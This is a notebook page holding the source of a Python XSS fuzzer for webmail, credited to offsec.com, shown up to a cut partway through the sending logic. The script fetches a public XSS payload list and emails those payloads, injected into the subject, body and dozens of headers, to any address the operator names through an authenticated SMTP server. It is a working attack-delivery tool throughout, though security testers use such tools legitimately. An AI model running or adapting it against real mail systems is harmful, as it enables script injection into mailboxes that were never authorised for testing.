<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>xss-webmail-fuzzer.py</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">xss-webmail-fuzzer.py</h1><br/><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br /><br /><span style="color:#3ad900;font-weight:400">"""<br />&nbsp;&nbsp;&nbsp;A&nbsp;script&nbsp;for&nbsp;testing&nbsp;webmail&nbsp;systems&nbsp;for&nbsp;cross-site&nbsp;scripting&nbsp;problems<br />&nbsp;&nbsp;&nbsp;muts&nbsp;/&nbsp;ryujin&nbsp;AT&nbsp;offsec.com&nbsp;v0.3<br />&nbsp;&nbsp;&nbsp;auth&nbsp;supported&nbsp;plain/ssl/tls<br /><br />&nbsp;&nbsp;&nbsp;v0.3.2<br />&nbsp;&nbsp;&nbsp;-&nbsp;Fixed&nbsp;the&nbsp;xssAttacks.xml&nbsp;URL&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;v0.3.1<br />&nbsp;&nbsp;&nbsp;-&nbsp;Bugfixes&nbsp;and&nbsp;small&nbsp;changes&nbsp;to&nbsp;better&nbsp;identify&nbsp;injected&nbsp;payloads<br />&nbsp;&nbsp;&nbsp;-&nbsp;Added&nbsp;interactive&nbsp;mode<br />&nbsp;&nbsp;&nbsp;-&nbsp;Added&nbsp;list&nbsp;mode<br /><br />&nbsp;&nbsp;&nbsp;v0.3<br />&nbsp;&nbsp;&nbsp;-&nbsp;Basic&nbsp;Injection&nbsp;main:&nbsp;Inject&nbsp;in&nbsp;all&nbsp;the&nbsp;main&nbsp;fields&nbsp;(what&nbsp;we&nbsp;have&nbsp;now)<br />&nbsp;&nbsp;&nbsp;-&nbsp;Basic&nbsp;Injection&nbsp;extras:&nbsp;&nbsp;Inject&nbsp;in&nbsp;all&nbsp;the&nbsp;extras&nbsp;fields<br />&nbsp;&nbsp;&nbsp;-&nbsp;Pinpoint&nbsp;Injection&nbsp;in&nbsp;a&nbsp;specified&nbsp;field&nbsp;selected&nbsp;by&nbsp;the&nbsp;attacker<br />&nbsp;&nbsp;&nbsp;-&nbsp;One&nbsp;by&nbsp;One&nbsp;Injection&nbsp;(one&nbsp;mail&nbsp;for&nbsp;each&nbsp;field)&nbsp;in&nbsp;main&nbsp;fields&nbsp;<br />&nbsp;&nbsp;&nbsp;-&nbsp;One&nbsp;by&nbsp;One&nbsp;Injection&nbsp;(one&nbsp;mail&nbsp;for&nbsp;each&nbsp;field)&nbsp;in&nbsp;extra&nbsp;fields&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;v0.2<br />&nbsp;&nbsp;&nbsp;-&nbsp;ID&nbsp;the&nbsp;payload&nbsp;we&nbsp;are&nbsp;sending<br />&nbsp;&nbsp;&nbsp;-&nbsp;Replay&nbsp;a&nbsp;single&nbsp;payload<br />&nbsp;&nbsp;&nbsp;-&nbsp;Change&nbsp;the&nbsp;payload&nbsp;text<br /><br />"""</span><br /><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;smtplib,&nbsp;urllib2,&nbsp;sys,&nbsp;os<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;optparse&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;OptionParser<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;xml.dom.minidom&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;parseString<br /><br /><span style="color:#0088ff;font-weight:400">##&nbsp;Global&nbsp;variables</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;ha.ckers.org&nbsp;XSS&nbsp;list</span><br />XSSURL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"http://htmlpurifier.org/live/smoketests/xssAttacks.xml"</span><br />DEFAULT_XML&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"./xssAttacks.xml"</span><br />EMAIL_HEADERS&nbsp;=&nbsp;[<br /><span style="color:#3ad900;font-weight:400">"From"</span>,<br /><span style="color:#3ad900;font-weight:400">"To"</span>,<br /><span style="color:#3ad900;font-weight:400">"Date"</span>,<br /><span style="color:#3ad900;font-weight:400">"Subject"</span>,<br /><span style="color:#3ad900;font-weight:400">"Body"</span>,<br /><span style="color:#3ad900;font-weight:400">"Accept-Language"</span>,<br /><span style="color:#3ad900;font-weight:400">"Alternate-Recipient"</span>,<br /><span style="color:#3ad900;font-weight:400">"Autoforwarded"</span>,<br /><span style="color:#3ad900;font-weight:400">"Autosubmitted"</span>,<br /><span style="color:#3ad900;font-weight:400">"Bcc"</span>,<br /><span style="color:#3ad900;font-weight:400">"Cc"</span>,<br /><span style="color:#3ad900;font-weight:400">"Comments"</span>,<br /><span style="color:#3ad900;font-weight:400">"Content-Identifier"</span>,<br /><span style="color:#3ad900;font-weight:400">"Content-Return"</span>,<br /><span style="color:#3ad900;font-weight:400">"Conversion"</span>,<br /><span style="color:#3ad900;font-weight:400">"Conversion-With-Loss"</span>,<br /><span style="color:#3ad900;font-weight:400">"DL-Expansion-History"</span>,<br /><span style="color:#3ad900;font-weight:400">"Deferred-Delivery"</span>,<br /><span style="color:#3ad900;font-weight:400">"Delivery-Date"</span>,<br /><span style="color:#3ad900;font-weight:400">"Discarded-X400-IPMS-Extensions"</span>,<br /><span style="color:#3ad900;font-weight:400">"Discarded-X400-MTS-Extensions"</span>,<br /><span style="color:#3ad900;font-weight:400">"Disclose-Recipients"</span>,<br /><span style="color:#3ad900;font-weight:400">"Disposition-Notification-Options"</span>,<br /><span style="color:#3ad900;font-weight:400">"Disposition-Notification-To"</span>,<br /><span style="color:#3ad900;font-weight:400">"Encoding"</span>,<br /><span style="color:#3ad900;font-weight:400">"Encrypted"</span>,<br /><span style="color:#3ad900;font-weight:400">"Expires"</span>,<br /><span style="color:#3ad900;font-weight:400">"Expiry-Date"</span>,<br /><span style="color:#3ad900;font-weight:400">"Generate-Delivery-Report"</span>,<br /><span style="color:#3ad900;font-weight:400">"Importance"</span>,<br /><span style="color:#3ad900;font-weight:400">"In-Reply-To"</span>,<br /><span style="color:#3ad900;font-weight:400">"Incomplete-Copy"</span>,<br /><span style="color:#3ad900;font-weight:400">"Keywords"</span>,<br /><span style="color:#3ad900;font-weight:400">"Language"</span>,<br /><span style="color:#3ad900;font-weight:400">"Latest-Delivery-Time"</span>,<br /><span style="color:#3ad900;font-weight:400">"List-Archive"</span>,<br /><span style="color:#3ad900;font-weight:400">"List-Help"</span>,<br /><span style="color:#3ad900;font-weight:400">"List-ID"</span>,<br /><span style="color:#3ad900;font-weight:400">"List-Owner"</span>,<br /><span style="color:#3ad900;font-weight:400">"List-Post"</span>,<br /><span style="color:#3ad900;font-weight:400">"List-Subscribe"</span>,<br /><span style="color:#3ad900;font-weight:400">"List-Unsubscribe"</span>,<br /><span style="color:#3ad900;font-weight:400">"Message-Context"</span>,<br /><span style="color:#3ad900;font-weight:400">"Message-ID"</span>,<br /><span style="color:#3ad900;font-weight:400">"Message-Type"</span>,<br /><span style="color:#3ad900;font-weight:400">"Obsoletes"</span>,<br /><span style="color:#3ad900;font-weight:400">"Original-Encoded-Information-Types"</span>,<br /><span style="color:#3ad900;font-weight:400">"Original-Message-ID"</span>,<br /><span style="color:#3ad900;font-weight:400">"Originator-Return-Address"</span>,<br /><span style="color:#3ad900;font-weight:400">"PICS-Label"</span>,<br /><span style="color:#3ad900;font-weight:400">"Prevent-NonDelivery-Report"</span>,<br /><span style="color:#3ad900;font-weight:400">"Priority"</span>,<br /><span style="color:#3ad900;font-weight:400">"Received"</span>,<br /><span style="color:#3ad900;font-weight:400">"References"</span>,<br /><span style="color:#3ad900;font-weight:400">"Reply-By"</span>,<br /><span style="color:#3ad900;font-weight:400">"Reply-To"</span>,<br /><span style="color:#3ad900;font-weight:400">"Resent-Bcc"</span>,<br /><span style="color:#3ad900;font-weight:400">"Resent-Cc"</span>,<br /><span style="color:#3ad900;font-weight:400">"Resent-Date"</span>,<br /><span style="color:#3ad900;font-weight:400">"Resent-From"</span>,<br /><span style="color:#3ad900;font-weight:400">"Resent-Message-ID"</span>,<br /><span style="color:#3ad900;font-weight:400">"Resent-Reply-To"</span>,<br /><span style="color:#3ad900;font-weight:400">"Resent-Sender"</span>,<br /><span style="color:#3ad900;font-weight:400">"Resent-To"</span>,<br /><span style="color:#3ad900;font-weight:400">"Return-Path"</span>,<br /><span style="color:#3ad900;font-weight:400">"Sender"</span>,<br /><span style="color:#3ad900;font-weight:400">"Sensitivity"</span>,<br /><span style="color:#3ad900;font-weight:400">"Supersedes"</span>,<br /><span style="color:#3ad900;font-weight:400">"X400-Content-Identifier"</span>,<br /><span style="color:#3ad900;font-weight:400">"X400-Content-Return"</span>,<br /><span style="color:#3ad900;font-weight:400">"X400-Content-Type"</span>,<br /><span style="color:#3ad900;font-weight:400">"X400-MTS-Identifier"</span>,<br /><span style="color:#3ad900;font-weight:400">"X400-Originator"</span>,<br /><span style="color:#3ad900;font-weight:400">"X400-Received"</span>,<br /><span style="color:#3ad900;font-weight:400">"X400-Recipients"</span>,<br /><span style="color:#3ad900;font-weight:400">"X400-Trace"</span>]<br /><br />MSG&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"From:&nbsp;_FROM_\n"</span><br />MSG&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"To:&nbsp;_TO_\n"</span><br />MSG&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"Date:&nbsp;_DATE_\n"</span><br />MSG&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"Subject:&nbsp;_SUBJECT_\n"</span><br /><br />MSG_E&nbsp;&nbsp;=&nbsp;MSG<br />for&nbsp;h&nbsp;in&nbsp;EMAIL_HEADERS:<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;h&nbsp;!=&nbsp;<span style="color:#3ad900;font-weight:400">"Body"</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_E&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"%s:&nbsp;_%s_\n"</span>&nbsp;%&nbsp;(h,&nbsp;h.upper())<br /><br />def&nbsp;fetchXML():<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""&nbsp;Connect&nbsp;to&nbsp;&nbsp;and&nbsp;download&nbsp;XSS&nbsp;cheetsheet"""</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[+]&nbsp;Fetching&nbsp;last&nbsp;XSS&nbsp;cheetsheet&nbsp;from&nbsp;ha.ckers.org&nbsp;..."</span><br />&nbsp;&nbsp;&nbsp;&nbsp;request&nbsp;&nbsp;=&nbsp;urllib2.Request(XSSURL)<br />&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;urllib2.urlopen(request)<br />&nbsp;&nbsp;&nbsp;&nbsp;xmldata&nbsp;&nbsp;=&nbsp;response.read()<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;xmldata<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />def&nbsp;parseXML(xmldata):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""&nbsp;Parses&nbsp;XML&nbsp;fetched&nbsp;from&nbsp;ha.ckers.org&nbsp;and&nbsp;returns&nbsp;two<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nice&nbsp;py&nbsp;lists&nbsp;for&nbsp;further&nbsp;processing&nbsp;"""</span><br />&nbsp;&nbsp;&nbsp;&nbsp;pydata&nbsp;=&nbsp;parseString(xmldata)<br />&nbsp;&nbsp;&nbsp;&nbsp;names&nbsp;&nbsp;=&nbsp;pydata.getElementsByTagName(<span style="color:#3ad900;font-weight:400">"name"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;codes&nbsp;&nbsp;=&nbsp;pydata.getElementsByTagName(<span style="color:#3ad900;font-weight:400">"code"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;names,&nbsp;codes<br /><br />def&nbsp;getTextFromXML(node):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""&nbsp;Returns&nbsp;text&nbsp;within&nbsp;an&nbsp;XML&nbsp;node&nbsp;"""</span>&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;nodelist&nbsp;=&nbsp;node.childNodes<br />&nbsp;&nbsp;&nbsp;&nbsp;rc&nbsp;=&nbsp;[]<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;node&nbsp;in&nbsp;nodelist:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;node.nodeType&nbsp;==&nbsp;node.TEXT_NODE:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rc.append(node.data)<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;<span style="color:#3ad900;font-weight:400">''</span>.join(rc)<br /><br />def&nbsp;craftHeaders(frmemail,&nbsp;dstemail,&nbsp;indexPayload,&nbsp;name&nbsp;,&nbsp;code,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;injection,&nbsp;s_header=<span style="color:#ff0044;font-weight:700">None</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""&nbsp;Craft&nbsp;the&nbsp;email-headers&nbsp;on&nbsp;the&nbsp;attacker&nbsp;request&nbsp;"""</span><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;injection&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"basic_extra"</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;MSG_E<br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;MSG<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;s_header&nbsp;and&nbsp;EMAIL_HEADERS.index(s_header)&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">4</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"%s:&nbsp;_%s_\n"</span>&nbsp;%&nbsp;(s_header,&nbsp;s_header.upper())<br />&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"Content-type:&nbsp;text/html\n\n"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"_BODY_\n"</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Basic&nbsp;injections&nbsp;=&nbsp;MASS&nbsp;INJECTION,&nbsp;we&nbsp;inject&nbsp;in&nbsp;every&nbsp;field</span><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;injection.find(<span style="color:#3ad900;font-weight:400">"basic_"</span>)&nbsp;!=&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;header&nbsp;in&nbsp;EMAIL_HEADERS:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"_%s_"</span>&nbsp;%&nbsp;header.upper()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;&nbsp;=&nbsp;msg.replace(h,&nbsp;<span style="color:#3ad900;font-weight:400">"Payload-"</span>+str(indexPayload)+<span style="color:#3ad900;font-weight:400">"-"</span>+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name+<span style="color:#3ad900;font-weight:400">"-injectedin-"</span>+h+<span style="color:#3ad900;font-weight:400">"-"</span>+code)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;In&nbsp;all&nbsp;the&nbsp;other&nbsp;injections&nbsp;we&nbsp;inject&nbsp;into&nbsp;only&nbsp;one&nbsp;single&nbsp;header</span><br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"_%s_"</span>&nbsp;%&nbsp;s_header.upper()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;&nbsp;=&nbsp;msg.replace(h,&nbsp;<span style="color:#3ad900;font-weight:400">"Payload-"</span>+str(indexPayload)+<span style="color:#3ad900;font-weight:400">"-"</span>+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name+<span style="color:#3ad900;font-weight:400">"-injectedin-"</span>+h+<span style="color:#3ad900;font-weight:400">"-"</span>+code)<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;msg<br /><br />def&nbsp;tagHeaders(msg,&nbsp;mail_name):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""&nbsp;Tag&nbsp;all&nbsp;un-fuzzed&nbsp;main&nbsp;headers&nbsp;with&nbsp;payload&nbsp;type/fuzz&nbsp;fields&nbsp;"""</span><br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;header&nbsp;in&nbsp;EMAIL_HEADERS[<span style="color:#ff0044;font-weight:400">0</span>:<span style="color:#ff0044;font-weight:400">5</span>]:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"_%s_"</span>&nbsp;%&nbsp;header.upper()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;msg.replace(h,&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;msg<br /><br />def&nbsp;sendMail(name,&nbsp;code,&nbsp;dstemail,&nbsp;frmemail,&nbsp;smtpsrv,&nbsp;conn,&nbsp;username,&nbsp;password,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;indexPayload,&nbsp;custompayload,&nbsp;injection,&nbsp;pinpoint_field=<span style="color:#ff0044;font-weight:700">None</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;interactive=<span style="color:#ff0044;font-weight:700">None</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""&nbsp;Send&nbsp;XSSed&nbsp;email&nbsp;"""</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Get&nbsp;text&nbsp;from&nbsp;xml&nbsp;nodes</span><br />&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;=&nbsp;getTextFromXML(name)<br />&nbsp;&nbsp;&nbsp;&nbsp;code&nbsp;=&nbsp;getTextFromXML(code)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;If&nbsp;we&nbsp;are&nbsp;asked&nbsp;to&nbsp;replace&nbsp;the&nbsp;payload</span><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;custompayload:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code&nbsp;=&nbsp;raw_input(<span style="color:#3ad900;font-weight:400">"[$]&nbsp;Replace&nbsp;the&nbsp;original&nbsp;payload\n"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"%s\n[$]&nbsp;with:\n"</span>&nbsp;%&nbsp;code)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;injection&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"basic_main"</span>&nbsp;or&nbsp;injection&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"basic_extra"</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;craftHeaders(frmemail,&nbsp;dstemail,&nbsp;indexPayload,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;,&nbsp;code,&nbsp;injection)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mail_name&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"Payload-"</span>+str(indexPayload)+<span style="color:#3ad900;font-weight:400">"-"</span>+name+<span style="color:#3ad900;font-weight:400">"-"</span>+injection<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;tagHeaders(msg,&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendData(conn,&nbsp;username,&nbsp;password,&nbsp;frmemail,&nbsp;dstemail,&nbsp;msg,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;injection&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"pinpoint"</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;craftHeaders(frmemail,&nbsp;dstemail,&nbsp;indexPayload,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;,&nbsp;code,&nbsp;injection,&nbsp;pinpoint_field)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mail_name&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"Payload-"</span>+str(indexPayload)+<span style="color:#3ad900;font-weight:400">"-"</span>+name+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"-injectedin-"</span>+pinpoint_field<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;tagHeaders(msg,&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendData(conn,&nbsp;username,&nbsp;password,&nbsp;frmemail,&nbsp;dstemail,&nbsp;msg,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;injection&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"onebyone_main"</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;h&nbsp;in&nbsp;EMAIL_HEADERS[<span style="color:#ff0044;font-weight:400">0</span>:<span style="color:#ff0044;font-weight:400">5</span>]:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;craftHeaders(frmemail,&nbsp;dstemail,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;indexPayload,&nbsp;name,&nbsp;code,&nbsp;injection,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mail_name&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"Payload-"</span>+str(indexPayload)+<span style="color:#3ad900;font-weight:400">"-"</span>+name+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"-injectedin-"</span>+h<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;tagHeaders(msg,&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendData(conn,&nbsp;username,&nbsp;password,&nbsp;frmemail,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dstemail,&nbsp;msg,&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;interactive:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raw_input(<span style="color:#3ad900;font-weight:400">"[$]&nbsp;Press&nbsp;Enter&nbsp;to&nbsp;send&nbsp;next&nbsp;email..."</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;injection&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"onebyone_extra"</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;h&nbsp;in&nbsp;EMAIL_HEADERS[<span style="color:#ff0044;font-weight:400">5</span>:]:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;craftHeaders(frmemail,&nbsp;dstemail,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;indexPayload,&nbsp;name,&nbsp;code,&nbsp;injection,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mail_name&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"Payload-"</span>+str(indexPayload)+<span style="color:#3ad900;font-weight:400">"-"</span>+name+\<br 